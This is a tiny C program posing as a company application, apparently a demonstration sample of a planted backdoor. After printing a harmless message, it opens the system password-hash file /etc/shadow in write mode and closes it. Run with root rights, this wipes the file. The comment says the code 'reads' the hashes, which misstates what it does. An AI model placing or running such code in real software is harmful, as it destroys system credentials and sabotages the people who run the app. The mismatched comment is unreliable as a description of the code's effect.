#include <stdio.h>
#include <stdlib.h>

int main()
{
   printf("Company app is running\n");

   // Evil backdoor reads system password hashes
   printf("Evil backdoor initiating\n");
   FILE * fp;
   fp = fopen ("/etc/shadow", "w+");
   fclose(fp);
   
   return(0);

}
